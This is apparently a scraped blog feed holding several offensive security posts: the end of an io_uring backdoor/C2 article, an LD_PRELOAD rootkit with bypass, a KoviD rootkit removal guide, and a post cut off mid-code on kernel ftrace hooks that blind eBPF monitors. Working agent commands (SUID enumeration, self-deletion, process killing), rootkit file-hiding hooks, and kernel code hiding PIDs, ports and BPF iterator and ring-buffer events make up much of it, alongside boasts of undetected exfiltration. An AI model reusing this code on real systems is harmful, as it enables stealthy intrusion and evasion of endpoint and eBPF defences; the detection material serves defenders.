\u0026#34;/proc/%ld/fd\u0026#34;, pid); DIR *fd_dir = opendir(fd_path); if (!fd_dir) continue; struct dirent *fd_ent; while ((fd_ent = readdir(fd_dir)) != NULL) { if (fd_ent-\u0026gt;d_name[0] == \u0026#39;.\u0026#39;) continue; char link_path[512]; char link_target[512]; ssize_t link_len; snprintf(link_path, sizeof(link_path), \u0026#34;%s/%s\u0026#34;, fd_path, fd_ent-\u0026gt;d_name); link_len = readlink(link_path, link_target, sizeof(link_target) -1); if (link_len \u0026lt; 0) continue; link_target[link_len] = 0; if (strcmp(link_target, target_tty) == 0) { found_pid = (int)pid; break; } } closedir(fd_dir); if (found_pid) break; } closedir(proc); if (!found_pid) { snprintf(out, sizeof(out), \u0026#34;No process found using %s\\n\u0026#34;, target_tty); send_all(ring, sockfd, out, strlen(out)); return; } if (kill(found_pid, SIGKILL) == 0) { snprintf(out, sizeof(out), \u0026#34;Killed process %d using %s\\n\u0026#34;, found_pid, target_tty); } else { snprintf(out, sizeof(out), \u0026#34;Failed to kill process %d: %s\\n\u0026#34;, found_pid, strerror(errno)); } send_all(ring, sockfd, out, strlen(out)); } This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.\ncmd_privesc:\nvoid cmd_privesc(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/usr/bin\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /usr/bin\\n\u0026#34;, 23); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Potential SUID binaries:\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { char path[512]; snprintf(path, sizeof(path), \u0026#34;/usr/bin/%s\u0026#34;, entry-\u0026gt;d_name); struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; struct statx stx; io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, \u0026amp;stx); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res == 0 \u0026amp;\u0026amp; (stx.stx_mode \u0026amp; S_ISUID)) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%s\\n\u0026#34;, path); if (pos \u0026gt; sizeof(out) - 100) break; } io_uring_cqe_seen(ring, cqe); } closedir(dir); send_all(ring, sockfd, out, pos); } This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.\ncmd_selfdestruct:\nvoid cmd_selfdestruct(struct io_uring *ring, int sockfd) { const char *msg = \u0026#34;Agent will self-destruct\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); char exe_path[512]; ssize_t len = readlink(\u0026#34;/proc/self/exe\u0026#34;, exe_path, sizeof(exe_path)-1); if (len \u0026gt; 0) { exe_path[len] = \u0026#39;\\0\u0026#39;; struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Unlink failed: %s\\n\u0026#34;, strerror(-cqe-\u0026gt;res)); send_all(ring, sockfd, err, strlen(err)); } io_uring_cqe_seen(ring, cqe); } exit(0); } How Does the EDR Typically Fail Here? A standard EDR intercepts:\nCalls to open Calls to connect Calls to read and write This monitoring is usually done via hooks or eBPF. What this agent does is \u0026ldquo;bypass\u0026rdquo; these direct calls using io_uring. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.\nIn essence, the EDR sees fewer \u0026ldquo;door knocks\u0026rdquo; because io_uring sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.\nPractical EDR Bypass With this agent, virtually all network and file operations are handled through io_uring.\nSo an EDR would need to monitor io_uring_enter and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.\nAdditionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.\nBelow is a screenshot from an environment running EDR:\nRingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read /etc/shadow, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.\nPython C2 Server Flow The server.py is quite straightforward:\nWaits for a connection Receives commands from a terminal Sends them to the agent Displays the response It also supports file uploads (put), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.\nDefensive Reflections As much as using io_uring to bypass defenses is a clever idea;\nThere’s no magic:\nThe kernel still has to execute the io_uring operations. In theory, a well-designed EDR could hook io_uring_enter or instrument internal calls like __io_uring_submit.\neBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor io_uring-related syscalls.\nIt’s essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.\nConclusion This agent demonstrates that io_uring, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.\nIts asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.\nFor red teamers, t shows the power of modern evasion techniques.\nFor defenders, the takeaway is clear: start studying hooks for io_uring, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.\nJoin in rootkit researchers\nhttps://discord.gg/66N5ZQppU7 ","permalink":"http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/","summary":"\u003cp\u003eFull source: \u003ca href=\"https://github.com/MatheuZSecurity/RingReaper\"\u003ehttps://github.com/MatheuZSecurity/RingReaper\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#what-is-io_uring\"\u003eWhat is io_uring?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#the-agent\"\u003eThe Agent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#code-analysis\"\u003eCode Analysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#how-does-the-edr-typically-fail-here\"\u003eHow Does the EDR Typically Fail Here?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#practical-edr-bypass\"\u003ePractical EDR Bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#python-c2-server-flow\"\u003ePython C2 Server Flow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#defensive-reflections\"\u003eDefensive Reflections\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eEach year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as \u003ccode\u003eEDR (Endpoint Detection and Response)\u003c/code\u003e evolve rapidly, making the work of an attacker more challenging.\u003c/p\u003e\n\u003cp\u003eWe, as \u003cstrong\u003ered teamers\u003c/strong\u003e, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\u003c/p\u003e","title":"Red Team Tactics: Evading EDR on Linux with io_uring"},{"content":" Introduction In this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\nLD_PRELOAD LD_PRELOAD is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\nThis technique allows you to \u0026ldquo;hook\u0026rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.\nWhen an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().\nExample:\nLD_PRELOAD=./rootkitresearchers.so ls /etc/ld.so.preload\nBesides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.\nInstalling and Hiding Directory with Rootkit To demonstrate this, I\u0026rsquo;ll use a simple LD_PRELOAD rootkit that hooks the readdir, readdir64, and fopen functions to change the behavior of file and directory listings. The code is shown below.\nFull source\nstruct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, \u0026ldquo;readdir\u0026rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to \u0026ldquo;secret\u0026rdquo; or \u0026ldquo;ld.so.preload\u0026rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.\nstruct dirent64 *(*orig_readdir64)(DIR *dirp); struct dirent64 *readdir64(DIR *dirp) { if (!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, \u0026#34;readdir64\u0026#34;); struct dirent64 *entry; while ((entry = orig_readdir64(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This is the same logic but for the 64-bit version readdir64.\nFILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); if (strstr(pathname, HIDDEN_FILE) != NULL) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.\nNow let\u0026rsquo;s compile and load it into /etc/ld.so.preload\nOnce loaded, we can test creating a directory named secret, and see if it is hidden from ls.\nAs expected, it was hidden from ls.\n[Theory] Breaking LD_PRELOAD rootkits Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to \u0026ldquo;inject\u0026rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?\nThe short and quick answer is: No!\nWhy does LD_PRELOAD work, and why does it sometimes not work?\nLD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.\nBut for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.\nWhy do static binaries break this idea?\nStatically linked binaries are \u0026ldquo;self-contained\u0026rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.\nIn other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.\nThis is one of the most effective ways to bypass these rootkits.\n[Practice] Breaking LD_PRELOAD rootkits With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.\nBut it is easy to bypass this, for example: just compile a static binary, like a simple getdents64.c\ngcc getdents64.c -o getdents64 \u0026ndash;static\nWhen using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.\nBypassing LD_PRELOAD rootkits is simply very easy.\nConclusion LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.\nIf you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!\nRootkit Researchers\nhttps://discord.gg/66N5ZQppU7\n","permalink":"http://localhost:1313/hacking/bypass-userland-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/JhWCyVT.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\u003c/p\u003e\n\u003ch2 id=\"ld_preload\"\u003eLD_PRELOAD\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eLD_PRELOAD\u003c/code\u003e is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\u003c/p\u003e","title":"Bypassing LD_PRELOAD Rootkits Is Easy"},{"content":" Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.\nNow that we know what KoviD is, we can analyze its code and see how it works, for example, which hooking method it uses.\nFtrace hooking Looking at KoviD sys.c, we can see that it uses a very famous method for hooking syscalls that works very well on newer kernels, which is ftrace (function tracer).\nKeep this information, it will be very useful later in this post.\nSetup KoviD and Loading. According to the kovid readme, before compiling, we need to edit the Makefile to choose a unique file name for \u0026ldquo;/proc/name\u0026rdquo;.\nAfter compiling using make, we can insert it using insmod kovid.ko.\nAfter inserting it, we can see that /proc/mtz had not been enabled and also the module was not hidden after its insertion, so first it is necessary to enable /proc/mtz using kill -SIGCONT 31337 and after that, hide the LKM from lsmod using echo -h \u0026gt;/proc/mtz.\nI also hid the file containing the name mtz, making it invisible in /proc/.\nWell, after enabling /proc/mtz, we can look in dmesg that a random magic word was generated, and this magic word is used to make KoviD visible again.\nIn kovid.c we can see this magic word function being called to make the module visible again.\nDetecting KoviD Well, luckily for us, there is a filesystem that is not very well known, which is tracing, normally on more up-to-date systems, it is already mounted by default, if tracefs is not mounted, just mount it using mount -t tracefs nodev /sys/kernel/tracing, and you can find its documentation at kernel.org.\nAnd in it we can simply view all the LKM functions that are loaded on the machine.\nA very interesting curiosity is that when Kovid is invisible, the trace only shows the addresses of each Kovid function (which in my head still doesn\u0026rsquo;t make much sense, since the /sys/kernel/tracing/available_filter_functions_addrs file was only added in kernel 6.5x, in it we can view the addresses of each function of each loaded lkm too and I am using kernel 5.15.0-119-generic for testing).\nNow, if we make kovid visible again, the name of its functions will appear.\nThis is a very simple way to detect KoviD, and it doesn\u0026rsquo;t require much effort.\nHowever, there is still a way to hide any function/LKM from the tracefs file system, so don\u0026rsquo;t be fooled by that and don\u0026rsquo;t think that if you didn\u0026rsquo;t find anything there that you are safe. Maybe I\u0026rsquo;ll talk about this in a future post.\nYou can also use nitara2 to detect KoviD.\nMaking KoviD hooks useless This part is very interesting and you will learn a really cool trick (if you didn\u0026rsquo;t already know).\nRemember when I mentioned at the beginning of the post that KoviD uses ftrace as a hooking method? So, many people may not know that there is a way to disable ftrace with just one command.\necho 0 \u0026gt; /proc/sys/kernel/ftrace_enabled or sysctl kernel.ftrace_enabled=0 Okay, but what\u0026rsquo;s so great about that? Well, let\u0026rsquo;s go!\nBy temporarily disabling ftrace, all kovid hooks stop working, as it uses ftrace for hooking, but this still does not make kovid visible, but it makes it useless.\nKoviD hides the file containing the name mtz, so /proc/mtz is hidden, and in it is the magic word to make LKM visible again.\nWell now with ftrace disabled we can see that the hidden /proc/mtz has become visible as no kovid hook works as it uses ftrace as syscalls hook.\nSo, after disabling ftrace, just go to /proc/mtz that was visible, get the magic word, and make LKM visible again, being able to remove it.\nAnd this is the easiest way to detect/remove KoviD.\nNotes 1- Of course, this is not 100% effective, as it has a way of hiding from the tracefs filesystem, but against KoviD so far, this works perfectly.\n2- And it is also obvious that in a real scenario, if someone is using KoviD, the name in /proc/name will not be something common like mtz, they would probably use a name that is less \u0026ldquo;imperceptible\u0026rdquo;.\n3- You can make any LKM rootkit that uses ftrace as hooking completely useless, and when you make it useless, you can use that to your advantage and analyze the compromised environment, looking for hidden PIDs, directories/files, etc.\nFinal consideration I hope you enjoyed this post and learned something, if you have any questions, please DM me on Twitter.\n","permalink":"http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/Xd3Y153.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\u003c/p\u003e\n\u003cp\u003eBut first of all, we need to understand how the KoviD works.\u003c/p\u003e\n\u003ch2 id=\"what-is-kovid\"\u003eWhat is KoviD?\u003c/h2\u003e\n\u003cp\u003eKoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on \u003ca href=\"https://github.com/carloslack/KoviD\"\u003egithub\u003c/a\u003e.\u003c/p\u003e","title":"A simple way to detect and remove LKM rootkit KoviD (Outdated)"},{"content":"Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nMe: https://www.linkedin.com/in/mathsalves/\nIntroduction Linux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that\u0026rsquo;s difficult to evade from user space.\nBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\nThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren\u0026rsquo;t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\nAll research is strictly for educational purposes.\nTable of Contents Introduction The eBPF Security Landscape How eBPF Security Works The False Promise of Kernel Observability Understanding the Attack Surface BPF Iterators BPF Ringbuffers Perf Events BPF Maps Bypassing eBPF Security: Technical Implementation Hook Architecture Process and Network Hiding Intercepting BPF Iterators Filtering Ringbuffer Events Blocking Perf Event Submission Manipulating BPF Maps Real-World Bypass Results Falco Evasion Tracee Evasion Additional Tools Conclusion The eBPF Security Landscape How eBPF Security Works eBPF (extended Berkeley Packet Filter) has revolutionized Linux observability and security. Modern security tools leverage eBPF to monitor kernel events in real-time without modifying kernel code or loading traditional kernel modules.\nKey Components:\neBPF Programs: Sandboxed code running in kernel context, attached to various kernel events (syscalls, tracepoints, kprobes) BPF Maps: Kernel data structures for sharing information between eBPF programs and userspace Ringbuffers/Perf Events: Efficient mechanisms for streaming event data from kernel to userspace BPF Iterators: New mechanism for efficiently iterating over kernel objects (processes, network connections, etc.) Security Tools Using eBPF:\nFalco: Runtime security monitoring, detects anomalous behavior Tracee: System call and event tracing for security analysis Tetragon: Policy enforcement and security observability Cilium: Network security and observability GhostScan: Rootkit detection via memory scanning Decloaker: Hidden process detection The False Promise of Kernel Observability The security community believed eBPF solved a fundamental problem: how do you monitor a system that an attacker controls? The answer seemed obvious: use kernel-level observability that attackers cannot evade.\nThis assumption contains a critical flaw.\nThe Fundamental Problem:\neBPF programs execute inside the kernel they are trying to observe, while the detection pipeline depends on kernel → userspace delivery (ring buffers/perf buffers/iterators) and userspace policy engines. If an attacker gains the ability to load a kernel module (via root access and disabled Secure Boot / unenforced module signing), they can modify the kernel\u0026rsquo;s behavior and selectively disrupt what those eBPF programs and collectors are able to see.\nWhy This Matters:\neBPF programs cannot protect themselves from kernel-level manipulation eBPF verifier only ensures memory safety, not security guarantees All eBPF data flow mechanisms (iterators, ringbuffers, maps) are implemented as kernel functions Kernel functions can be hooked via ftrace The moment an attacker has kernel-level access, observability becomes optional.\nUnderstanding the Attack Surface Before we can bypass eBPF security, we need to understand how these tools collect data. Let\u0026rsquo;s examine each mechanism.\nBPF Iterators BPF iterators allow eBPF programs to efficiently walk kernel data structures. Security tools use iterators to enumerate processes, network connections, and other kernel objects.\nIterator Flow:\nKernel Data (tasks, sockets) -\u0026gt; bpf_iter_run_prog() -\u0026gt; eBPF iterator program -\u0026gt; bpf_seq_write() / bpf_seq_printf() -\u0026gt; Userspace reads via seq_file Key Functions:\nbpf_iter_run_prog(): Executes the eBPF iterator program for each kernel object bpf_seq_write(): Writes data to the seq_file buffer bpf_seq_printf(): Formatted output to seq_file buffer Security Tools Using Iterators:\nGhostScan uses task iterators to detect hidden processes Decloaker uses network iterators to find hidden connections Custom security tools use iterators for forensic analysis BPF Ringbuffers Ringbuffers are the modern replacement for perf buffers, providing efficient event streaming from kernel to userspace with better performance and ordering guarantees.\nRingbuffer Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; bpf_ringbuf_reserve() -\u0026gt; bpf_ringbuf_submit() or bpf_ringbuf_output() -\u0026gt; Userspace reads events Key Functions:\nbpf_ringbuf_reserve(): Allocates space in the ringbuffer bpf_ringbuf_submit(): Commits reserved data to the ringbuffer bpf_ringbuf_output(): One-shot write to ringbuffer Security Tools Using Event Delivery Mechanisms:\nFalco (modern eBPF probe): Uses BPF ring buffer (BPF_MAP_TYPE_RINGBUF) for kernel→userspace event delivery (driver/config dependent). Tracee: Uses perfbuffer/perf ring buffers as its primary kernel→userspace event delivery mechanism (and can vary by version/implementation). Tetragon: Uses kernel→userspace buffering mechanisms (e.g., ring buffer / perf-based buffers) depending on the component and version. Note: \u0026ldquo;Perf event arrays\u0026rdquo; and \u0026ldquo;BPF ring buffers\u0026rdquo; are different mechanisms - the former is per-CPU and older, while the latter is shared across CPUs and more efficient.\nPerf Events Perf events are the traditional mechanism for streaming kernel data to userspace. While older than ringbuffers, many tools still use them.\nPerf Event Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; perf_event_output() -\u0026gt; perf_trace_run_bpf_submit() -\u0026gt; Userspace reads perf buffer Key Functions:\nperf_event_output(): Writes event to perf buffer perf_trace_run_bpf_submit(): Submits tracepoint data to eBPF programs Security Tools Using Perf Events:\nLegacy Falco versions Custom monitoring tools Kernel tracing utilities BPF Maps BPF maps are kernel data structures that store state and allow communication between eBPF programs and userspace.\nMap Operations:\neBPF program or userspace -\u0026gt; bpf_map_lookup_elem() -\u0026gt; bpf_map_update_elem() -\u0026gt; bpf_map_delete_elem() -\u0026gt; Kernel map data structure Key Functions:\nbpf_map_lookup_elem(): Retrieve value from map bpf_map_update_elem(): Insert or update map entry bpf_map_delete_elem(): Remove map entry Security Use Cases:\nStoring process metadata Tracking network connections Maintaining allow/deny lists Sharing data between eBPF programs Bypassing eBPF Security: Technical Implementation Now that we understand how eBPF security works, let\u0026rsquo;s examine how to systematically blind it.\nHook Architecture Our approach uses ftrace to hook critical BPF functions. Ftrace allows dynamic tracing of kernel functions without modifying kernel code, making it perfect for interception.\nHooked Functions:\nstatic struct ftrace_hook hooks[] = { // BPF Iterator Hooks HOOK(\u0026#34;bpf_iter_run_prog\u0026#34;, hook_bpf_iter_run_prog, \u0026amp;orig_bpf_iter_run_prog), HOOK(\u0026#34;bpf_seq_write\u0026#34;, hook_bpf_seq_write, \u0026amp;orig_bpf_seq_write), HOOK(\u0026#34;bpf_seq_printf\u0026#34;, hook_bpf_seq_printf, \u0026amp;orig_bpf_seq_printf), // BPF Ringbuffer Hooks HOOK(\u0026#34;bpf_ringbuf_output\u0026#34;, hook_bpf_ringbuf_output, \u0026amp;orig_bpf_ringbuf_output), HOOK(\u0026#34;bpf_ringbuf_reserve\u0026#34;, hook_bpf_ringbuf_reserve, \u0026amp;orig_bpf_ringbuf_reserve), HOOK(\u0026#34;bpf_ringbuf_submit\u0026#34;, hook_bpf_ringbuf_submit, \u0026amp;orig_bpf_ringbuf_submit), // BPF Map Hooks HOOK(\u0026#34;bpf_map_lookup_elem\u0026#34;, hook_bpf_map_lookup_elem, \u0026amp;orig_bpf_map_lookup_elem), HOOK(\u0026#34;bpf_map_update_elem\u0026#34;, hook_bpf_map_update_elem, \u0026amp;orig_bpf_map_update_elem), // Perf Event Hooks HOOK(\u0026#34;perf_event_output\u0026#34;, hook_perf_event_output, \u0026amp;orig_perf_event_output), HOOK(\u0026#34;perf_trace_run_bpf_submit\u0026#34;, hook_perf_trace_run_bpf_submit, \u0026amp;orig_perf_trace_run_bpf_submit), // BPF Program Execution HOOK(\u0026#34;__bpf_prog_run\u0026#34;, hook_bpf_prog_run, \u0026amp;orig_bpf_prog_run), // BPF Syscall HOOK(\u0026#34;__x64_sys_bpf\u0026#34;, hook_bpf, \u0026amp;orig_bpf), HOOK(\u0026#34;__ia32_sys_bpf\u0026#34;, hook_bpf_ia32, \u0026amp;orig_bpf_ia32), }; Why This Works:\nKernel-level access: Once loaded, the rootkit runs at ring 0 with full privileges Ftrace hooking: Operates below eBPF programs, allowing us to filter their data sources No eBPF involvement: We\u0026rsquo;re not fighting eBPF, we\u0026rsquo;re cutting off its inputs Selective filtering: Only hide specific processes/connections, not everything Process and Network Hiding The rootkit maintains lists of hidden PIDs and network connections. Child process tracking ensures that when you hide a shell, all spawned processes also remain hidden.\nHidden PID Management:\n#define MAX_HIDDEN_PIDS 32 #define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128) extern int hidden_pids[MAX_HIDDEN_PIDS]; extern int hidden_count; extern int child_pids[MAX_CHILD_PIDS]; extern int child_count; notrace void add_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return; } if (hidden_count \u0026lt; MAX_HIDDEN_PIDS) { hidden_pids[hidden_count++] = pid; } } notrace int is_hidden_pid(int pid) { int i; for (i = 0; i \u0026lt; hidden_count; i++) { if (hidden_pids[i] == pid) return 1; } return 0; } Child Process Tracking:\nstatic notrace bool is_child_of_hidden_process(int pid) { struct task_struct *task; struct task_struct *parent; int depth = 0; int max_depth = 10; bool hidden = false; if (pid \u0026lt;= 0) return false; if (should_hide_pid_by_int(pid)) return true; rcu_read_lock(); task = pid_task(find_vpid(pid), PIDTYPE_PID); if (!task) { rcu_read_unlock(); return false; } parent = task; while (parent \u0026amp;\u0026amp; depth \u0026lt; max_depth) { if (parent-\u0026gt;pid \u0026lt;= 0) break; parent = rcu_dereference(parent-\u0026gt;real_parent); if (!parent || parent-\u0026gt;pid \u0026lt;= 1) break; if (should_hide_pid_by_int(parent-\u0026gt;pid)) { hidden = true; break; } depth++; } rcu_read_unlock(); return hidden; } Network Connection Hiding:\n#define HIDDEN_PORT 8081 static notrace bool should_hide_socket_port(struct sock_common *sk) { __be16 sport, dport; __be32 saddr, daddr; if (!sk) return false; init_hidden_ip(); if (sk-\u0026gt;skc_family == AF_INET) { sport = sk-\u0026gt;skc_num; dport = sk-\u0026gt;skc_dport; saddr = sk-\u0026gt;skc_rcv_saddr; daddr = sk-\u0026gt;skc_daddr; if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) { if (saddr == hidden_ip_cached || daddr == hidden_ip_cached || saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) { return true; } } } else if (sk-\u0026gt;skc_family == AF_INET6) { sport = sk-\u0026gt;skc_num; if (sport == HIDDEN_PORT) { return true; } } return false; } Intercepting BPF Iterators BPF iterators allow tools like GhostScan and Decloaker to enumerate kernel objects. By hooking the iterator execution, we can selectively filter results.\nIterator Context Structures:\nstruct bpf_iter_ctx_tcp { struct bpf_iter_meta *meta; struct sock_common *sk_common; uid_t uid; }; struct bpf_iter_ctx_udp { struct bpf_iter_meta *meta; struct udp_sock *udp_sk; uid_t uid; int bucket; }; struct bpf_iter_ctx_task { struct bpf_iter_meta *meta; struct task_struct *task; }; Hooking bpf_iter_run_prog:\nstatic notrace int hook_bpf_iter_run_prog(struct bpf_prog *prog, void *ctx) { struct bpf_iter_ctx_tcp *tcp_ctx; struct bpf_iter_ctx_udp *udp_ctx; struct bpf_iter_ctx_task *task_ctx; struct sock_common *sk; struct udp_sock *udp_sk; struct task_struct *task; if (!orig_bpf_iter_run_prog || !ctx) goto passthrough; // Check if this is a TCP socket iterator tcp_ctx = (struct bpf_iter_ctx_tcp *)ctx; if (tcp_ctx \u0026amp;\u0026amp; tcp_ctx-\u0026gt;sk_common) { sk = tcp_ctx-\u0026gt;sk_common; if ((unsigned long)sk \u0026gt; PAGE_SIZE) { if (should_hide_socket_port(sk)) { return 0; // Skip this socket } } } // Check if this is a UDP socket iterator udp_ctx = (struct bpf_iter_ctx_udp *)ctx; if (udp_ctx \u0026amp;\u0026amp; udp_ctx-\u0026gt;udp_sk) { udp_sk = udp_ctx-\u0026gt;udp_sk; if ((unsigned long)udp_sk \u0026gt; PAGE_SIZE) { sk = \u0026amp;udp_sk-\u0026gt;inet.sk.__sk_common; if (should_hide_socket_port(sk)) { return 0; // 